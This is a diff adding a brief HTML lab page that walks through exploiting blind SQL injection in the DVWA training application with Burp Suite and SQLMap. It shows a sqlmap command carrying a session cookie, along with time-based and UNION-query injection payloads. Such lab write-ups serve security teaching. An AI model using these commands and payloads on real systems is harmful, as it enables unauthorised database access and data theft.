@@ -1,0 +1,19 @@
+ <meta name=”robots” content=”noindex,nofollow”/>
+  <a href=../index.html>Back to home</a>
+<hr/>
+<h1>Exploit DVWA Blind SQL Injection (SQLi) using SQLMap and Burp Suite</h1>
+
+<p></p>
+
+<h2>Burp Suite</h2>
+<p><ol>
+<ul>Copy the PHPSESSID of a logged in DVWA using Burp Suite</ul>
+</ol></p>
+
+<h2>SQLMap</h2>
+<p><ol>
+  <ul><i>sqlmap -u 'http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#' --cookie="security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0"</i></ul>
+  <ul>SQLMap will show the possible injection points:</ul>
+  <ul>time-based blind -> id=2' AND (SELECT 6160 FROM (SELECT(SLEEP(5)))ztHs) AND 'PLtb'='PLtb&Submit=Submit</ul>
+  <ul>UNION query -> id=2' UNION ALL SELECT CONCAT(0x7178707071,0x776b6e6d4f5047597976616b49416877515a4442597a51575553485651717474727276497546596c,0x71626a7171),NULL-- -&Submit=Submit</ul>
+</ol></p>
